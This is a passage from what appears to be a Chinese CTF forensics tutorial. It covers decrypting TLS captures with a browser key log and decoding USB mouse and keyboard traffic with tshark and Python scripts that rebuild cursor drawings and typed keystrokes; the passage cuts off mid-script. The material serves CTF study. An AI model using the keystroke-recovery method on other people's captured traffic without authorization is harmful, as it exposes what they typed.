                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20240923182420367.png"
                      alt="image-20240923182420367"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20240923182450747.png"
                      alt="image-20240923182450747"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20240923185513305.png"
                      alt="image-20240923185513305"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20240923185450226.png"
                      alt="image-20240923185450226"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20240923185919625-1727089160808-1.png"
                      alt="image-20240923185919625"
                ></p>
<h3 id="TLS流量分析"><a href="#TLS流量分析" class="headerlink" title="TLS流量分析"></a>TLS流量分析</h3>
  <div class="note p-4 mb-4 rounded-small info">
    <p>TLS是HTTPS安全传输层采用的协议，TLS是HPPTS通信的基础部分</p>

  </div>

<blockquote>
<p>CTF中如果拿不到TLS握手过程中的加密方法、密钥、随机数等信息则无法加密出HTTPS数据</p>
</blockquote>
<h4 id="TLS握手过程"><a href="#TLS握手过程" class="headerlink" title="TLS握手过程"></a>TLS握手过程</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/bVbCCMD.png"
                      alt="SSL : TLS 握手过程"
                ></p>
<p>在握手过程中如果拿到其中的预祝秘钥或则主密钥就相当于拿到了会话的秘钥，也就能对加密内容进行解密</p>
<h4 id="拿到主密钥"><a href="#拿到主密钥" class="headerlink" title="拿到主密钥"></a>拿到主密钥</h4><p>在环境变量里面设置<code>SSLKEYLOGFILE</code>指向一个<code>sslkey.log</code>的文件路径</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20240923211700933.png"
                      alt="image-20240923211700933"
                ></p>
<p>然后在浏览器中访问HTTPS网址，同时开启wireshark抓包，就能抓到TLS流量了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20240923211911409.png"
                      alt="image-20240923211911409"
                ></p>
<p>导入保存的log文件进行解密</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20240923213905847.png"
                      alt="image-20240923213905847"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20240923213909476.png"
                      alt="image-20240923213909476"
                ></p>
<h3 id="USB流量分析"><a href="#USB流量分析" class="headerlink" title="USB流量分析"></a>USB流量分析</h3>
  <div class="note p-4 mb-4 rounded-small info">
    <p>USB协议的数据部分在Leftover Capture Data域中</p>

  </div>

<blockquote>
<p>通常利用tshark命令将其中的USB流量数据单独提取出来</p>
</blockquote>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#有先后顺序</span></span><br><span class="line">tshark -r atta.pcapng -T fields -e usb.capdata &gt; usbdata.txt</span><br><span class="line">tshark -r atta.pcapng -T fields -e usbhid.data &gt; usbdata.txt</span><br></pre></td></tr></table></figure></div>

<h4 id="鼠标流量分析"><a href="#鼠标流量分析" class="headerlink" title="鼠标流量分析"></a>鼠标流量分析</h4><p>鼠标数据报含义，一般为4&#x2F;8字节</p>
<ul>
<li><p>第一个字节代表按键</p>
<ul>
<li>当取0x00时，代表没有按键</li>
<li>为0x01时，代表按左按键</li>
<li>为0x02时，代表当前按键为右键</li>
</ul>
</li>
<li><p>第二个字节可以成是一个signed byte类型，其最高位为符号位</p>
<ul>
<li>值为正时，代表鼠标水平右移动多少像素</li>
<li>为负时，代表水平左移多少像素</li>
</ul>
</li>
<li><p>第三个字节与第二个字节类似，代表垂直上下移动的偏移。</p>
<ul>
<li><p>值为正时，代表鼠标垂直上移动多少像素</p>
</li>
<li><p>为负时，代表垂直下移多少像素</p>
</li>
</ul>
</li>
<li><p>第四个字节表示滚轮数据，为拓展字节</p>
<ul>
<li>为0时，没有滚轮运动</li>
<li>为1时，垂直向上滚动一下</li>
<li>为2时，水平滚动右键一次</li>
<li>为0xFE时，水平滚动左键单击一下</li>
<li>为0xFF时，垂直向下滚动一下</li>
</ul>
</li>
</ul>
<p>每个操作系统数据区字节不一定相同</p>
<p>数据区为6字节时，第1字节表示按键指示左右键，第2个字节表示水平位移，第3个字节表示垂直位移</p>
<p><strong>数据区为8字节时，第1字节表示按键指示左右键，第3个字节表示水平位移，第5个字节表示垂直位移</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20240925004942699.png"
                      alt="image-20240925004942699"
                ></p>
<blockquote>
<p>HID Data 和 Leftover Capture Data 是一个意思</p>
</blockquote>
<h5 id="手动脚本"><a href="#手动脚本" class="headerlink" title="手动脚本"></a>手动脚本</h5><p><strong>删除文件中空行</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#使用脚本删除空行</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;usbdata.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    lines = f.readlines()</span><br><span class="line">lines = <span class="built_in">filter</span>(<span class="keyword">lambda</span> x: x.strip(), lines)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;usbdata.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.writelines(lines)</span><br></pre></td></tr></table></figure></div>

<p><strong>文件以冒号相隔</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#将上面的文件用脚本分隔，加上冒号；</span></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;usbdata.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) </span><br><span class="line">fi=<span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">  a=f.readline().strip() </span><br><span class="line">  <span class="keyword">if</span> a:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(a)==<span class="number">16</span>:<span class="comment">#键盘流量的话len为16鼠标为8 </span></span><br><span class="line">      out=<span class="string">&#x27;&#x27;</span></span><br><span class="line">      <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(a),<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">if</span> i+<span class="number">2</span> != <span class="built_in">len</span>(a):</span><br><span class="line">          out+=a[i]+a[i+<span class="number">1</span>]+<span class="string">&quot;:&quot;</span> </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">          out+=a[i]+a[i+<span class="number">1</span>] </span><br><span class="line">      fi.write(out) </span><br><span class="line">      fi.write(<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line">  <span class="keyword">else</span>: </span><br><span class="line">    <span class="keyword">break</span> </span><br><span class="line">fi.close()</span><br></pre></td></tr></table></figure></div>

<p><strong>生成坐标</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># 此脚本只处理鼠标数据区为8字节的，若数据区长度不一样请修改脚本内容</span></span><br><span class="line">nums = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;usbdata.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">result = <span class="built_in">open</span>(<span class="string">&#x27;result.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">posx = <span class="number">0</span></span><br><span class="line">posy = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    line = line.strip()  <span class="comment"># 去除空行</span></span><br><span class="line">    <span class="comment"># 以下是处理形如“00000000ffff0000”8字节的内容</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(line) == <span class="number">16</span>:</span><br><span class="line">        x = <span class="built_in">int</span>(line[<span class="number">4</span>:<span class="number">6</span>], <span class="number">16</span>)</span><br><span class="line">        y = <span class="built_in">int</span>(line[<span class="number">8</span>:<span class="number">10</span>], <span class="number">16</span>)</span><br><span class="line">    <span class="comment"># 以下是处理形如“00:00:00:00:ff:ff:00:00”8字节的内容</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">len</span>(line) == <span class="number">24</span>:</span><br><span class="line">        x = <span class="built_in">int</span>(line[<span class="number">6</span>:<span class="number">8</span>], <span class="number">16</span>)</span><br><span class="line">        y = <span class="built_in">int</span>(line[<span class="number">12</span>:<span class="number">14</span>], <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> x &gt; <span class="number">127</span>: x -= <span class="number">256</span></span><br><span class="line">    <span class="keyword">if</span> y &gt; <span class="number">127</span>: y -= <span class="number">256</span></span><br><span class="line">    posx += x</span><br><span class="line">    posy += y</span><br><span class="line">    <span class="comment"># 第一个字节为左右键，1为左键，2为右键，0无按键</span></span><br><span class="line">    btn_flag = <span class="built_in">int</span>(line[<span class="number">0</span>:<span class="number">2</span>], <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">if</span> btn_flag == <span class="number">1</span>:</span><br><span class="line">        result.write(<span class="built_in">str</span>(posx) + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(posy) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">keys.close()</span><br><span class="line">result.close()</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20240925012733493.png"
                      alt="image-20240925012733493"
                ></p>
<p><strong>将坐标转化为图片</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(<span class="number">2000</span>,<span class="number">2000</span>),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))<span class="comment">#创建Image对象(尽量大)</span></span><br><span class="line">f =<span class="built_in">open</span>(<span class="string">&#x27;result.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">    point =line.split()</span><br><span class="line">    img.putpixel((<span class="built_in">int</span>(point[<span class="number">0</span>]),<span class="built_in">int</span>(point[<span class="number">1</span>])),(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))<span class="comment">#读取文件中的每一行，并修改像素 </span></span><br><span class="line">f.close() </span><br><span class="line">img.show()</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20240925012720575.png"
                      alt="image-20240925012720575"
                ></p>
<h5 id="半自动工具"><a href="#半自动工具" class="headerlink" title="半自动工具"></a>半自动工具</h5><blockquote>
<p>最后的绘图可以不用编程</p>
</blockquote>
<p><a class="link"   href="https://sourceforge.net/projects/gnuplot/#:~:text=Download%20gnuplot%20for%20free.%20A%20portable," >gunplot <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 绘图工具</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">plot <span class="string">&quot;路径&quot;</span> using 1:2</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20240925013319152.png"
                      alt="image-20240925013319152"
                ></p>
<h5 id="全自动工具"><a href="#全自动工具" class="headerlink" title="全自动工具"></a>全自动工具</h5><p><a class="link"   href="https://github.com/giggitygi/UsbMiceDataHacker" >UsbMiceDataHacker <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 自动抓取鼠标流量并绘图（可能不好用，反正我没试出来）（可能需要kali）</p>
<p><a class="link"   href="https://github.com/WangYihang/USB-Mouse-Pcap-Visualizer" >USB-Mouse-Pcap-Visualizer <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 生成.csv文件并在线绘图（强烈推荐）</p>
<blockquote>
<p>很好用，但需要注意tshark文件必须要在C盘的默认下载位置，以及需要安装好些pip包</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20240925015545199.png"
                      alt="image-20240925015545199"
                ></p>
<h4 id="键盘流量分析"><a href="#键盘流量分析" class="headerlink" title="键盘流量分析"></a>键盘流量分析</h4>
  <div class="note p-4 mb-4 rounded-small info">
    <p>USB协议的数据部分在Capture Data域中</p>

  </div>

<p>数据包长度一般为8字节，几乎只有第3个字节不为00（可以当做判断流量包特征）（或者出现同时按键），第1个字节是判断是否按下shift键</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20240925024248601.png"
                      alt="image-20240925024248601"
                ></p>
<blockquote>
<p>与鼠标流量一样通常利用tshark命令将其中的USB流量数据单独提取出来</p>
</blockquote>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#有先后顺序</span></span><br><span class="line">tshark -r atta.pcapng -T fields -e usb.capdata &gt; usbdata.txt</span><br><span class="line">tshark -r atta.pcapng -T fields -e usbhid.data &gt; usbdata.txt</span><br></pre></td></tr></table></figure></div>

<h5 id="手动脚本-1"><a href="#手动脚本-1" class="headerlink" title="手动脚本"></a>手动脚本</h5><p><strong>删除文件中空行</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#使用脚本删除空行</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;usbdata.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    lines = f.readlines()</span><br><span class="line">lines = <span class="built_in">filter</span>(<span class="keyword">lambda</span> x: x.strip(), lines)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;usbdata.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.writelines(lines)</span><br></pre></td></tr></table></figure></div>

<p><strong>文件以冒号相隔</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#将上面的文件用脚本分隔，加上冒号；</span></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;usbdata.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) </span><br><span class="line">fi=<span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">  a=f.readline().strip() </span><br><span class="line">  <span class="keyword">if</span> a:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(a)==<span class="number">16</span>:<span class="comment">#键盘流量的话len为16鼠标为8 </span></span><br><span class="line">      out=<span class="string">&#x27;&#x27;</span></span><br><span class="line">      <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(a),<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">if</span> i+<span class="number">2</span> != <span class="built_in">len</span>(a):</span><br><span class="line">          out+=a[i]+a[i+<span class="number">1</span>]+<span class="string">&quot;:&quot;</span> </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">          out+=a[i]+a[i+<span class="number">1</span>] </span><br><span class="line">      fi.write(out) </span><br><span class="line">      fi.write(<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line">  <span class="keyword">else</span>: </span><br><span class="line">    <span class="keyword">break</span> </span><br><span class="line">fi.close()</span><br></pre></td></tr></table></figure></div>

<p><strong>生成按键字符</strong></p>
<blockquote>
<p>该脚本只对“00:00:0b:00:00:00:00:00”类数据有效</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">normalKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;e&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;i&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;j&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;o&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;r&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;t&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;4&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;6&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;7&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;8&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;9&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;-&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;=&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;[&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;]&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;,&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;.&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">shiftKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;E&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;I&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;J&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;O&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;R&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;T&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;Y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;Z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;!&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;$&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;^&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;*&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;(&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;)&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;_&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;+&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;|&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;:&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">output = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;usbdata.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> (line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> line[<span class="number">1</span>]!=<span class="string">&#x27;2&#x27;</span>) <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> 